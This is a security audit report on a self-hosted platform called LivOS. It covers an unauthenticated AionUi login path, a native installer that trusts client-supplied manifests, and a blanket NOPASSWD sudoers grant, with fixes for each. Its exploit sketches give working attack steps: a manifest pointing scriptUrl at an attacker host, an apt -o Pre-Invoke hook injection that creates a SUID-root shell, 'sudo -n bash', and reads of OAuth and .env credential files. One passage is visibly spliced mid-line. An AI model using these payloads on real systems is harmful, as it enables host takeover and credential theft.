## Executive Summary

The v45 hardening waves (256/257/258) materially improved the core posture this pass was able to confirm: auth now fails closed in the tRPC path (256-04), session jti revocation exists (257-04), `livinityd:8080` is loopback-bound + UFW-denied (257), the cred-egress proxy replaced the old operator-OAuth-credential bind-mount (256-02, closing LIVOS-001/034), the compose sanitizer strips dangerous primitives from non-builtin composes (256-03), the public-forbidden spine fail-closes app exposure (258), and the four committed default-password literals (LIVOS-021/030/032) were scrubbed from source (257-05). Multiple feared regressions were investigated and **refuted** — the bwrap sandbox does NOT silently fall back to unsandboxed exec, the fail2ban admin router is fully admin-gated with no injection, and session revoke has no IDOR.

However, the **new surfaces shipped after the audit re-opened or introduced a cluster of Critical/High issues**, and they share two themes:

1. **The `/liv` (AionUi "Liv AI") apex surface is an unauthenticated front door to a passwordless-root agent.** `GET /liv-login` mints an AionUi session cookie for *anyone* with zero LivOS auth; the apex host has no server-side auth gate; the Referer-only `/api/*` routing is client-spoofable; and the agent process behind it (`liv-assistant.service`) runs as `bruce` with read-write access to the operator's `~/.claude` OAuth tokens — and `bruce` holds `(ALL) NOPASSWD: ALL` (live-confirmed). This chain is an unauthenticated path to operator-credential exfil and host root.

2. **The native installer (`installV37`) and the `bruce` sudoers grant turn any authenticated user into host root.** `installV37` is `privateProcedure` (any member/guest) and trusts a fully client-supplied manifest with no server-side re-fetch and no admin gate; its `script`/`deb`/`apt`/`apt-repo` methods run attacker-chosen code/packages, and `bruce`'s blanket `NOPASSWD:ALL` makes the second-stage root pivot trivial. The same blanket sudoers grant is the single biggest amplifier of every other `bruce`-reachable bug.

**Top residual risks (most severe first):**
- **LIVOS-041 (Critical):** Unauthenticated `/liv-login` → AionUi cookie → operator-credentialed agent → host compromise.
- **LIVOS-042 (Critical):** `installV37` native install is non-admin + client-manifest-trusting → authenticated-user RCE as `bruce` + full secret exfil.
- **LIVOS-043 (High):** `bruce ALL=(ALL) NOPASSWD:ALL` drop-in subsumes the Phase-192 least-privilege grant — every `bruce` bug is a root bug (live-confirmed).
- **LIVOS-044 / LIVOS-045 (High):** Native `apt`/`apt-repo`/`script`/`deb` methods give authenticated-user host-root via apt `-o` hook injection, attacker apt key+repo pinning, and `curl|bash`-as-`bruce`.
- **LIVOS-046 (High):** Cred-egress proxy authenticates by docker-bridge source IP only — any container borrows the operator's Claude/Gemini OAuth subscription, defeating the 256-02 metered-key isolation.

**What to fix first (in order):**
1. **Put the entire `/liv` family behind LivOS `forward_auth`** (the same gate 256-04 added to app subdomains), gate the `/liv-login` Express handler on `verifyToken(LIVINITY_SESSION)`, and bind AionUi `:3020` + add a host auth gate. (LIVOS-041, LIVOS-053, LIVOS-054, LIVOS-056)
2. **Make `installV37` `adminProcedure` AND re-fetch the manifest server-side from the trusted catalog** (discard the client `manifest`), validate every install URL/package/host, make checksums mandatory. (LIVOS-042, LIVOS-044, LIVOS-045, LIVOS-047)
3. **Delete the `bruce ALL=(ALL) NOPASSWD:ALL` drop-in** and rely on the scoped Phase-192 Cmnd_Alias fragment. (LIVOS-043)
4. **Re-classify the new Settings power/storage backends as `adminProcedure`**, validate `deviceId`/mount inputs, and add a per-app secret to the cred-egress proxy. (LIVOS-048, LIVOS-049, LIVOS-050, LIVOS-046)

## New-Surface Findings

### LIVOS-041 — Unauthenticated `GET /liv-login` mints an AionUi session → operator-credentialed Claude Code RCE on the host

- **Severity:** Critical
- **Location:** `livos/packages/livinityd/source/modules/server/liv-login-handler.ts:26-66`; mounted at `livos/packages/livinityd/source/index.ts:565` (`app.get('/liv-login', ...)`, no auth middleware); apex catch-all `domain/caddy.ts:577-588`; the qr-mint endpoints also reachable through `caddy.ts:360-369` (`@liv` → `:3020`)
- **Surface:** WS-A4
- **Description:** `/liv-login` is a plain GET handler with NO authentication (`_req` is unused). On every hit it calls AionUi (`127.0.0.1:3020`) `POST /api/webui/generate-qr-token` then `POST /api/auth/qr-login`, captures the resulting `Set-Cookie: aionui-session=<JWT>` and forwards it verbatim to the caller. The apex host `bruce.livinity.io` is public at the HTTP layer: the app-gateway middleware returns `next()` for `host===mainDomain` (`server/index.ts:401`) and there is no global Express auth gate; `/liv-login` is whitelisted past the SPA catch-all (`index.ts:2089`) and falls through to the apex `reverse_proxy 127.0.0.1:8080`. The minted `aionui-session` cookie is the ONLY gate on the AionUi chat, whose agent process (`liv-assistant.service`) runs as `User=bruce` with `ReadWritePaths=/home/bruce/.claude` (the operator's live OAuth tokens) and drives Claude Code — and `bruce` holds `(ALL) NOPASSWD: ALL` (LIVOS-043, live-confirmed). The flag-gate on `/liv-login` is a Redis feature flag that defaults ON.
- **Exploit Sketch:**
  1. Reach `https://bruce.livinity.io` (public origin, relay-fronted).
  2. `curl -i https://bruce.livinity.io/liv-login` → `302` + `Set-Cookie: aionui-session=<valid 30-day JWT>` (the unit test proves an empty `{}` request still receives the cookie).
  3. Replay the cookie: `curl -b 'aionui-session=<JWT>' https://bruce.livinity.io/liv/api/...` (routed to `:3020` with no Caddy auth), or open the AionUi WS at `wss://bruce.livinity.io/ws`.
  4. Drive the agent (yolo/auto-approve per project memory) to `cat ~/.claude/.credentials.json`, exfiltrate the operator OAuth token, read `/opt/livos/.env` (DB creds, `LIV_API_KEY`, JWT secret material), or `sudo -n bash` for unrestricted root.
- **Prior Remediation:** None on the `/liv` family. 256-04 added `forward_auth` ONLY to app/native subdomains (`caddy.ts` `gatedHandleBody` line 675 + native loop line 781); the apex `/liv*` handles have no `forward_auth`. 257 bound `livinityd:8080` to loopback + UFW-denied 8080 but did not touch the separate `liv-assistant:3020` process. 256's cred-egress proxy is container-only and does not cover this host-resident process.
- **Residual Risk:** Gating only the Express handler is insufficient — AionUi's own qr-mint endpoints (`/liv/api/webui/generate-qr-token`, `/liv/api/auth/qr-login`) remain reachable straight through the `@liv` Caddy proxy, so the gate MUST sit at the Caddy `forward_auth` layer covering the whole `/liv` namespace plus `/liv-login`. Two sub-points are live-confirmation-pending: (a) AionUi's actual `:3020` bind host (LIVOS-049 live-confirmed loopback-only, which closes the direct-port variant) and (b) end-to-end external reachability of the apex through the Server5 relay.
- **Recommendation:** Emit `forward_auth 127.0.0.1:8080 { uri /auth/verify; copy_headers Cookie }` (401→`/login`) in front of `LIV_ASSISTANT_HANDLE`, `LIV_ASSISTANT_SUBRESOURCE_HANDLE` (`@liv_ws` + `@liv_api_subresource`), `LIVOS_TERMINAL_WS_HANDLE`, and the `/liv-login` route, so a valid `LIVINITY_SESSION` is required before any AionUi traffic (incl. cookie minting). Additionally gate the `/liv-login` Express handler on `verifyToken(LIVINITY_SESSION)` and bind AionUi `:3020` to `127.0.0.1` + UFW-deny 3020.
- **Verifier note:** CONFIRMED — every link verified from on-disk source and exercised by the project's own unit tests (`liv-login-handler.test.ts` Tests 1/2/4: empty credential-free request gets a 30-day cookie; `update.sh:1717` smoke proves `bruce.livinity.io/liv/api/auth/status → :3020` over the public path). The qr-mint-through-Caddy residual variant is also confirmed reachable.

### LIVOS-042 — Native `installV37` bypasses the 256 admin-gate; client-supplied manifest → any authenticated user gets RCE as `bruce` + full secret exfil

- **Severity:** Critical
- **Location:** `livos/packages/livinityd/source/modules/apps/routes.ts:734-808` (`installV37` = `privateProcedure`, input `manifest: z.unknown()`); `apps/install-contracts.ts:174-201` (dispatcher, no gate); `apps/native-installer.ts:543-599` (script method runs `bash <downloaded>` as `bruce`); `apps/install-admin-gate.ts:39` (gate exists but only called from `apps.ts:546`)
- **Surface:** WS-A6
- **Description:** `apps.installV37` is declared `privateProcedure` (`trpc.ts:29` = `isAuthenticated` only, ANY role incl. member/guest; `LIV_API_KEY` holder maps to admin). It accepts `section:'native'`, `name`, `category`, and `manifest: z.unknown()` directly from the caller and hands them to the `InstallDispatcher` → `NativeInstaller` with NO admin check and NO server-side manifest re-fetch. The 256-03 admin gate `assertInstallAllowed({isAdmin, isGeneratedTemplate, manifest})` is invoked ONLY inside the legacy Docker compose path (`apps.ts:546`); the v37 dispatcher (the ONLY route to the Phase 259 native apt/deb/appimage/apt-repo/script installers) never calls it. The legacy path also sources its manifest server-side by `appId` from trusted builtin/platform-DB/git sources (`apps.ts:500-526`); `installV37` trusts the client manifest verbatim. The `script` method validates only `^https://`, `scriptSha256` is optional, and the file is `bash`-ed as the `bruce` user — who owns `/opt/livos`, the master Chrome profile/OAuth tokens, and holds the NOPASSWD apt + `livos-add-apt-repo.sh` sudoers grants.
- **Exploit Sketch:**
  1. Authenticate as any non-admin LivOS user (member/guest/invite-redeemed), or hold `LIV_API_KEY`.
  2. HTTP POST `apps.installV37` (in `httpOnlyPaths`, `common.ts:126`) with `{appId:'evil', section:'native', name:'x', category:'x', manifest:{install:{primary:'script', scriptUrl:'https://attacker.tld/p.sh'}, launch:{binaryPath:'/usr/bin/true'}, desktopEntry:{name:'x'}}}`. The benign `launch.binaryPath` passes `nativeAppConfigSchema.parse()` while the payload lives in the un-validated `install.script.scriptUrl`.
  3. `isAuthenticated` passes; `requireRole` is never applied; `assertInstallAllowed` is never called.
  4. `NativeInstaller` downloads `p.sh` (no `scriptSha256` ⇒ no integrity check) and `bash`-es it as `bruce` → reads `/opt/livos/.env` (JWT secret, DATABASE_URL, LIV_API_KEY, Redis pw), exfiltrates `~/.config` Chrome/OAuth creds, then `sudo -n bash` (LIVOS-043) for host root.
- **Prior Remediation:** 256-03 added `assertInstallAllowed` and wired it into `apps.ts` (legacy Docker) + `addRepository`/`removeRepository` (`adminProcedure`). It did NOT wire the gate into the v37 dispatcher path — exactly the path Phase 259's native root installers use.
- **Residual Risk:** Adding `adminProcedure` alone without server-side manifest re-fetch still leaves a tricked/CSRF'd admin (or a compromised admin session) able to ship an attacker manifest. Server-side manifest re-fetch by `appId` (mirror `apps.ts:500-526` / `fetchPlatformTemplate`) is the durable fix.
- **Recommendation:** Make `installV37`/`uninstallV37` resolve `isAdmin` from `ctx.currentUser` and call `assertInstallAllowed` BEFORE dispatch — preferably make native/script/apt-repo installs `adminProcedure`. Additionally, re-fetch the manifest server-side from the platform catalog by `appId` and ignore the client-supplied `manifest` field for any privileged install method. The fix must live in livinityd (server), not the store iframe bridge.
- **Verifier note:** CONFIRMED. `installV37` is `privateProcedure`; `manifest: z.unknown()` is forwarded verbatim; `assertInstallAllowed` never appears in `routes.ts`; the `nativeAppConfigSchema` validates only the `launch` block, never `manifest.install`. One refinement: the script runs as `bruce` (not literal one-step root); host-root is a chained second stage via LIVOS-043. Critical stands on the `bruce`-level RCE + full secret exfil alone.

### LIVOS-043 — `bruce ALL=(ALL) NOPASSWD:ALL` sudoers drop-in subsumes the Phase-192 least-privilege grant (every `bruce`-reachable bug is a root bug)

- **Severity:** High
- **Location:** `scripts/install/deploy-livinityd.sh:437` (`printf '%s\n' "${user} ALL=(ALL) NOPASSWD:ALL" > "$tmp_sudoers"` → `/etc/sudoers.d/99-bruce`, called at `:2326`), `:1679-1680` (`User=bruce`/`Group=bruce`); narrow Phase-192 fragment `scripts/install/sudoers.d/livinityd` (+ `scripts/migrate-to-bruce-user.sh:120`); **live `/etc/sudoers.d/99-bruce` confirmed**
- **Surface:** WS-A3
- **Description:** `livos.service` runs livinityd (a network-facing daemon) as `User=bruce`. The deploy provisions TWO sudoers files: the carefully-scoped Phase-192 fragment (one binary per `Cmnd_Alias`, explicitly documented "No NOPASSWD: ALL") AND, via `_dld_create_desktop_user()`, an unconditional `/etc/sudoers.d/99-bruce` containing `bruce ALL=(ALL) NOPASSWD:ALL`. The blanket grant always wins regardless of `sudoers.d` lexical ordering (it is purely additive), entirely defeating the Phase-192 least-privilege work for the very account that runs the daemon. Any livinityd shell-out path (fail2ban panel, docker exec, WebApp Chrome launcher, compose install) — or any RCE/injection that reaches a shell as `bruce` — runs arbitrary commands as root with no password. This is the single biggest amplifier of every other `bruce`-reachable bug, including LIVOS-041 and LIVOS-042.
- **Exploit Sketch:**
  1. Gain any code-exec or command-injection as `bruce` (via LIVOS-041 `/liv` agent, LIVOS-042 native install, or any future livinityd shell-injection).
  2. Run `sudo -n bash` (or `sudo -n cat /opt/livos/data/secrets/jwt` / `sudo -n cat /opt/livos/.env`) — the `99-bruce` drop-in grants ALL with NOPASSWD, succeeding instantly with no password and no command restriction.
  3. Full host root: read the JWT signing secret (forge admin JWTs), DATABASE_URL + LIV_API_KEY, all operator OAuth/creds, rewrite `/etc/caddy/Caddyfile`, pivot to Server5 over the relay tunnel.
- **Prior Remediation:** 256/257/258 did not touch the sudoers/desktop-user provisioning. Phase 192 attempted least-privilege for `bruce` but is silently and totally overridden by this drop-in written in the SAME deploy run. `update.sh` (the live-box update path) does NOT touch sudoers, so the blanket grant originates at fresh install and persists.
- **Residual Risk:** Even after scoping, a fail2ban grant lets an admin-compromised session unban/whitelist attacker IPs — bounded to fail2ban state and audited. The dominant risk is the blanket grant itself; until removed, every `bruce`-level bug is a root bug. Live remediation requires `rm /etc/sudoers.d/99-bruce` on the Mini PC (and any other installed box) — a code change alone will not remove the already-written file.
- **Recommendation:** Delete the `_dld_create_desktop_user` `${user} ALL=(ALL) NOPASSWD:ALL` write (`deploy-livinityd.sh:437`) and rely solely on the existing Phase-192 `Cmnd_Alias` fragment, extended with a narrow fail2ban entry (`Cmnd_Alias LIVINITYD_FAIL2BAN = /usr/bin/fail2ban-client status, ... set * unbanip *, set * banip *, set * addignoreip *`) invoked via `sudo -n` rather than relying on a blanket grant or socket access.
- **Verifier note:** CONFIRMED in source AND live on the Mini PC (2026-06-09): `cat /etc/sudoers.d/99-bruce` = `bruce ALL=(ALL) NOPASSWD:ALL`; `systemctl show livos.service -p User` = `bruce`; `sudo -n -l` reports `(ALL : ALL) ALL` and `(ALL) NOPASSWD: ALL`. The fail2ban sub-claim is partially overstated (fail2ban-admin spawns a fixed, Zod/regex-validated argv with no shell, and is admin-gated) — but the dominant, fully-valid finding is the blanket drop-in itself.

### LIVOS-044 — Unvalidated `aptPackages` reaches the `apt-get install -y *` NOPASSWD grant — apt `-o` hook injection / local-deb gives host-root code execution

- **Severity:** High
- **Location:** `livos/packages/livinityd/source/modules/apps/native-installer.ts:378-411` (apt), `:446-513` (apt-repo); `scripts/install/sudoers.d/livos-native:37` (`Cmnd_Alias LIVOS_NATIVE = /usr/bin/apt-get install -y *`)
- **Surface:** WS-A6
- **Description:** `manifest.install.aptPackages` is an unvalidated `string[]` from the client manifest (no schema covers the `install` block). It is spread directly into `sudo -n /usr/bin/apt-get install -y -o Dpkg::Options::=--force-confold ...pkgs`. The sudoers grant allows `/usr/bin/apt-get install -y *` with NOPASSWD for `bruce`, and the trailing `*` matches ALL remaining arguments — proven by the installer's own argv, which itself injects `-o Dpkg::Options::=--force-confold` after `-y`. apt-get honors `-o <CONFIG>=<VALUE>` options anywhere on the line, including hook directives (`DPkg::Pre-Invoke`, `DPkg::Post-Invoke`, `APT::Update::Pre-Invoke`) that execute arbitrary shell as root via `/bin/sh`. execa `$` uses no shell (so this is option-injection, not classic shell injection) but the unvalidated literal package args are the whole problem. The same flaw affects the `apt-repo` follow-on install.
- **Exploit Sketch:**
  1. Via LIVOS-042, supply `manifest.install = {primary:'apt', aptPackages:['-o','DPkg::Pre-Invoke::=cp /bin/bash /tmp/.r; chmod 4755 /tmp/.r','coreutils']}`.
  2. The installer runs `sudo -n /usr/bin/apt-get install -y -o Dpkg::Options::=--force-confold -o DPkg::Pre-Invoke::=cp /bin/bash /tmp/.r;... coreutils`.
  3. sudoers `*` matches; apt fires the `Pre-Invoke` hook as root → SUID-root `/tmp/.r` → `/tmp/.r -p` = host root.
  4. Alternatively pass a local `.deb` path (written by the `script` method first) as a "package" arg.
- **Prior Remediation:** 256/257 hardened compose and bound livinityd to loopback but did not constrain the apt argv or the sudoers wildcard; this grant predates and is unchanged by v45.
- **Residual Risk:** Even with package-name validation, `apt-get install -y <legit-pkg>` can pull maintainer scripts that run as root; pin to a vetted package set. The `*` sudoers wildcard remains broad until a fixed wrapper replaces it.
- **Recommendation:** Strictly validate every `aptPackages` element against `^[a-z0-9][a-z0-9+._-]*$` (Debian package-name charset) and REJECT any element starting with `-` or containing `/`, `=`, or whitespace, BEFORE building argv. Wrap apt in a fixed helper (like the `apt-repo` one) accepting only validated positional package names so the `-o` flags are pinned by the rule, and forbid `apt-get install` of arbitrary local file paths. The sudoers comment claiming apt "would reject arbitrary strings" is false for `-o` hooks.
- **Verifier note:** CONFIRMED — authenticated (any-role) → host-root LPE via apt `-o` hook injection. Severity adjusted to High (not Critical) because it requires a valid non-admin session (`privateProcedure`), not a pre-auth vector. The `deb` method passes a sanitized `/tmp` path so it is NOT injectable here; `script`/`appimage` run as `bruce` (no sudo). ### LIVOS-058 — bwrap sandbox `usable` gate is PATH-only (`bwrap --version`), no runtime userns probe → agent shell hard-DoSes if userns unavailable at runtime

The control fails toward availability-loss (LIVOS-058), not toward security-control-disabled. *Pre-existing good outcome of the Phase 256-01 pure-PATH branch + always-on `buildScrubbedEnv`.* (Blemish: `shell.ts:51` `sandboxed: BWRAP_AVAILABLE` log can read `true` on a run where bwrap failed at runtime.)
- **WS-A1 session list/revoke scoping: CLOSED** (covered under the WS-A3 entry above) — owner-scoped, parameterized, `privateProcedure`-gated, jti-gate fails closed; the only WS-A1 residual is the non-exploitable forensics gap (null device/IP, frozen `last_seen`, and renewed/rotated tokens never recorded via `createSession`) folded into the WS-A1 hardening recommendation. **However**, the cross-surface revocation gap below is NOT closed and is recorded as a new finding companion: the jti revocation gate exists ONLY in the tRPC `isAuthenticated` middleware; the `/auth/verify` forward_auth gate, the `/__livos_sso` bounce, and `/__livos_auth` (which mints a 30-day cookie via `signUserToken` but never calls `createSession`, so its jti has no row and is un-revocable) all skip revocation. *This is the same root cause as the apex/`forward_auth` gaps (LIVOS-053, LIVOS-041) and is addressed by adding a revocation + active-user check to `/auth/verify`, `/__livos_sso`, and the `/api` resolver, plus calling `createSession` in `/__livos_auth`.* Tracked under the Phase 262 WS1 scope below.
- **WS-B3 Server5 committed default-pw literals (LIVOS-021/030/032): SOURCE-VERIFIED-CLOSED (live rotation operator-confirm-required).** Every committed default-password literal (`LivPlatform2024`, `LivPostgres2024!`, `NexusRedis2024!`, `LivRedis2024!`) is gone from tracked source: `db.ts`/`drizzle.config.ts`/`ecosystem.config.cjs` now fail-loud on missing `DATABASE_URL`/`REDIS_URL`; `DEFAULT_DATABASE_URL` is deleted; `docker-compose.postgres.yml` uses `${POSTGRES_PASSWORD:?}`; `heartbeat-runner.ts` parses the Redis pw from `REDIS_URL` via `REDISCLI_AUTH`; `setup.sh` generates secrets with `openssl rand`; `setup-server4.sh` is deleted. `git grep` returns zero deployed-source hits. *Closed by Phase 257-05.* **Caveat (operator action, Server5 off-limits to us):** the LIVE Server5 `platform` DB and relay Redis passwords must be confirmed rotated out of band — until then treat the pre-rotation values (still recoverable from git history under `.planning/` + `SECURITY-AUDIT.md`) as compromised; consider a history scrub if the repo is or was ever public.

## Industry-Grounded Recommendations (WS-C)

Prioritized, each tagged to a concrete LivOS surface. Themes: network-edge, secrets, update/supply-chain, backup.

### Network-edge posture

- **[High] Apply `forward_auth` to EVERY protected route — multi-user mode silently bypasses the gate.** When `livos:system:multi_user==='true'`, every app subdomain takes the `caddy.ts:607-638` branch that emits a bare `reverse_proxy :8080` with NO `forward_auth` and NO public-access carve-out (the code comment flags this as "the one way the 258 spine is silently bypassed"; the `:8080` Express gateway decides public-bypass on a separate legacy `public` boolean that never consults `isPublicForbidden`). Mini PC is single-user today (dormant), but flipping the multi-user toggle ships an un-authenticated edge for all installed apps. *Fix:* emit the `gatedHandleBody` forward_auth block in the multi-user branch OR make the `:8080` gateway fail-closed (session + `isPublicForbidden` re-assert) for ALL subdomain requests, and gate the multi-user toggle on that middleware existing; add a test asserting no caddy emit branch produces a `:8080` reverse_proxy without a `forward_auth` gate or explicit public carve-out. (Per Authelia/Caddy guidance: one mandatory choke point no routing branch can skip.) *Surface:* `caddy.ts:607-638`, `server/index.ts:415,440-458`, `apps/public-forbidden.ts`.
- **[Medium] Adopt mesh-VPN-only (ZeroTier/Tailscale) as the canonical remote-access path with zero public ports.** Today app subdomains are exposed to the internet via Caddy through the Server5 relay; ZeroTier is used only as a management overlay. The current best-practice self-hosting pattern (Umbrel/CasaOS + Tailscale, "zero open ports") closes every public port and reaches services exclusively over the mesh. *Fix:* ship an explicit "mesh-only" posture that binds the Caddy listener to the ZeroTier/Tailscale interface and drops the Server5 public-relay vhosts, demoting the cookie gate to defense-in-depth; keep the relay path as an opt-in per-app "public exposure" mode. *Surface:* `server/bind-host.ts`, `caddy.ts`, `reference_minipc.md` topology.
- **[Medium] Firewall the cred-egress proxy port 13129 at the host (pairs with LIVOS-046).** It binds `0.0.0.0` and relies solely on the in-process `172.16.0.0/12` source-IP gate to hand out operator OAuth bearers; no UFW/iptables rule pins it to the docker bridge interface. *Fix:* bind to the specific docker bridge gateway address (e.g. `172.17.0.1`) OR add an installer iptables/UFW rule allowing 13129 only on `docker0`/`br-*` and DROP elsewhere (next to the 257 UFW-deny-8080 step); tighten the `/12` to the actual bridge CIDR. *Surface:* `cred-egress-proxy.ts:542-547`.
- **[Low] Validate `LIVOS_BIND_HOST` so a misconfiguration cannot re-expose the admin daemon.** `resolveBindHost()` returns the env var verbatim with only a trim/non-empty check; setting it to `0.0.0.0` silently re-exposes the daemon that 257-02 hid behind loopback. *Fix:* reject `0.0.0.0`/`::`/public IPs; constrain to RFC1918 + `100.64.0.0/10` + `fc00::/7`, falling back to `127.0.0.1` with a logged warning. *Surface:* `server/bind-host.ts:21-27`.

### Secrets management

- **[High] Finish the credential-store DEK migration (LIVOS-052).** Refactor the `getKey`/`getLegacyKey`/lazy-re-key pattern out of `registry-credentials.ts` into one shared module (`modules/secrets/dek.ts`) and have `stack-secrets.ts`, `git-credentials.ts`, and `backup-secrets.ts` import it. Keep the `sha256(JWT)` fallback ONLY as a decrypt path for legacy blobs. (NIST SP 800-57 key-usage separation.) *Surface:* the four `*-credentials.ts`/`*-secrets.ts` stores.
- **[Low] Add a key-rotation path + per-app secret isolation (envelope encryption).** Today one DEK file protects every credential with no rotation. *Fix:* move to per-app/per-credential DEKs wrapped by a KEK (`{wrappedDEK, iv, tag, ct}`), add an admin-gated `rotateKEK()` tRPC route that re-wraps without touching plaintext, and consider sourcing the KEK from the Linux kernel keyring or an age identity rather than a flat 0600 file. (SOPS+age / Vault Transit envelope-encryption model.) *Surface:* `registry-credentials.ts` + siblings, `mcp/local/liv-vault/index.ts`.

### Update / supply-chain integrity

- **[High] Gate native installs admin-only AND resolve manifests server-side (LIVOS-042).** `installV37` is `privateProcedure` with a client-supplied `manifest: z.unknown()`; privileged package/repo installation (apt, third-party apt key+repo, root `.deb`) is an admin-only operation and trust must come from a server-resolved, curated manifest. *Fix:* make `installV37` `adminProcedure` for `section==='native'` (or call `assertInstallAllowed`), discard `input.manifest` and re-fetch by `appId+section` from the platform DB (mirror `fetchPlatformTemplate`), and treat apt-repo/deb/script as inherently admin-only regardless of `isGeneratedTemplate`. *Surface:* `apps/routes.ts:734-808`, `apps/native-installer.ts`.
- **[High] Pin apt signing keys by fingerprint; make download checksums mandatory; reject `http://` (LIVOS-044/045/055).** Add an `aptKeyFingerprint` to apt-repo manifests and assert the imported key's fingerprint equals the pin; make `debSha256`/`scriptSha256`/`appimageSha256` mandatory (fail-closed when absent); reject `http://` in `downloadToFile` and re-validate every redirect. Pin fingerprints for the curated repos (Brave/Signal/Spotify) in-repo. *Surface:* `native-installer.ts:201-238,378-513,543-599`, `scripts/install/livos-add-apt-repo.sh`.
- **[High] Populate the dormant update/install trust root.** `update.sh:356-435` and `install.sh:95-128` already have a real verify-before-deploy function, but with no `scripts/install/EXPECTED_RELEASE` and no `scripts/install/maintainer.gpg` shipped (both absent in-repo), every `bash /opt/livos/update.sh` clones GitHub HEAD and rsync+build+restarts it as root with no signature check (logs "deploying unverified HEAD" and proceeds). *Fix:* sign release tags + commit `maintainer.gpg` (public key) so the signed-tag branch goes live, OR at minimum ship `EXPECTED_RELEASE` pinned per release so fetched-HEAD≠pin fails closed; long-term adopt cosign-signed bundles + `cosign verify-blob`. Until then, document `update.sh` as running unverified root code. (Mirror the `curl|bash` `install.sh` one-liner: publish a per-release installer sha256/signature, refuse to proceed past self-clone when no pin material is present unless `LIVOS_INSTALL_ALLOW_UNVERIFIED=1`.) *Surface:* `update.sh:356-435`, `install.sh:81-128`.
- **[Medium] Sign app-store manifests; force community/native installs through the curated DB.** Native manifests never pass the compose-sanitizer trust boundary and (per LIVOS-042) can be client-supplied. *Fix:* always resolve manifests server-side from the curated platform DB, add a manifest-signing step (store key, verified on-device before any privileged native action), and surface an explicit "unverified community source" warning before any native install (mirror Umbrel: official store curated, community apps Docker-only/no host privilege). *Surface:* `apps/compose-sanitizer.ts`, `apps/native-installer.ts`, Server5 `apps` table.

### Backup security

- **[High] Stop persisting the Kopia backup repository password in cleartext.** `backups.ts:286` pushes `{id,path,password}` into the livinityd store JSON so unattended backups can decrypt; anyone with read access to the store file (root, host-escape, an exfiltrated `/opt/livos/data` backup, a path-traversal read) obtains the password that decrypts every snapshot — and restore is `publicProcedureWhenNoUserExists` (gated only by knowledge of that password). *Fix:* move it into the AES-256-GCM vault pattern (Redis-only, off the on-disk store) or adopt Umbrel's "shown once, never recoverable" model requiring operator re-entry for restore; at minimum ensure the store file is 0600 root-only and excluded from any backup landing on an untrusted destination. *Surface:* `backups/backups.ts:246,286,432`, `backups/routes.ts:80-90`.
- **[Medium] Add backup-destination immutability / append-only + a no-delete credential (ransomware resistance).** The scheduler uploads with a single read-write-DELETE credential and no S3 Object Lock / versioning / Borg append-only, so an attacker who compromises the Mini PC can wipe the offsite copies too. *Fix:* default to a no-delete S3 key (retention via lifecycle/versioning, not client `DeleteObject`), add an "immutable destination" option requiring Object Lock, document Borg `--append-only` for SFTP, use a distinct prune credential, and surface a 3-2-1 recommendation. *Surface:* `scheduler/backup.ts:62-68,149-167,292`.
- **[Low] Derive the backup-vault key from a dedicated secret, not `sha256(JWT)`.** Same single-secret blast radius as LIVOS-052 (the `jwt` file both signs sessions and encrypts S3/SFTP backup creds). *Fix:* generate `/opt/livos/data/secrets/backup-vault-key` at install; ensure `data/secrets/` is excluded from any backup that could land on an untrusted destination. *Surface:* `scheduler/backup-secrets.ts:21-31`.

## Proposed Next Hardening Phase (Phase 262)

A concrete, severity-ordered scope the operator can hand to `/gsd:plan-phase`. Each workstream maps to the confirmed findings + top industry recs.

### WS1 — Close the `/liv` (AionUi) unauthenticated front door (Critical)
- Maps to: LIVOS-041, LIVOS-047, LIVOS-049, LIVOS-053, LIVOS-054 + the cross-surface revocation gap.
- Tasks: (a) emit `forward_auth 127.0.0.1:8080 { uri /auth/verify; copy_headers Cookie }` in front of the whole `/liv` family (`@liv`, `@liv_ws`, `@liv_api_subresource`, `/liv-login`, `LIVOS_TERMINAL_WS_HANDLE`) AND a fail-closed apex gate; (b) gate the `/liv-login` Express handler on `verifyToken(LIVINITY_SESSION)`; (c) replace the Referer-only `/api/*` matcher with a path-prefix matcher (`path /liv/api/*`); (d) bind `aionui-web` to `127.0.0.1` + UFW-deny 3020; (e) add revocation + active-user re-check to `/auth/verify`, `/__livos_sso`, the `/api` resolver, and call `createSession` in `/__livos_auth`; (f) move AionUi off the shell origin OR remove the `/liv/trpc/*` bridge + require a non-cookie credential on tRPC.
- Success criteria: `curl https://bruce.livinity.io/liv-login` without a valid `LIVINITY_SESSION` returns 401/redirect (no `aionui-session` cookie minted); `/liv`, `/ws`, `/api/*`→`:3020` all 401 unauthenticated; a revoked/inactive session is rejected at `/auth/verify`; test asserts no apex/`/liv` route reverse_proxies without `forward_auth`.

### WS2 — Lock down the native installer pipeline (Critical)
- Maps to: LIVOS-042, LIVOS-044, LIVOS-045, LIVOS-055 + WS-C update/supply-chain.
- Tasks: (a) make `installV37`/`uninstallV37` `adminProcedure` (or call `assertInstallAllowed`) AND re-fetch the manifest server-side from the trusted catalog by `appId`, discarding `input.manifest`; (b) validate every `aptPackages` element (`^[a-z0-9][a-z0-9+._-]*$`, reject leading `-`/`/`/`=`/whitespace) and wrap apt in a fixed helper so the sudoers `-o` flags are pinned; (c) require `scriptSha256`/`debSha256`/`appimageSha256` (fail-closed) + host allowlist + https-only; (d) add `aptKeyFingerprint` pinning and scope/drop the `Pin-Priority 1000`; (e) re-validate scheme+host on every `downloadToFile` redirect, cap redirect count.
- Success criteria: a member/guest `installV37` call returns FORBIDDEN; a manifest with an injected `-o DPkg::Pre-Invoke` aptPackage is rejected pre-spawn; an artifact with no/short sha256 or non-allowlisted/`http://` host is refused; a redirect to a private/`http://` host is blocked.

### WS4 — Re-classify the new Settings backends + cred-egress isolation (High/Medium)
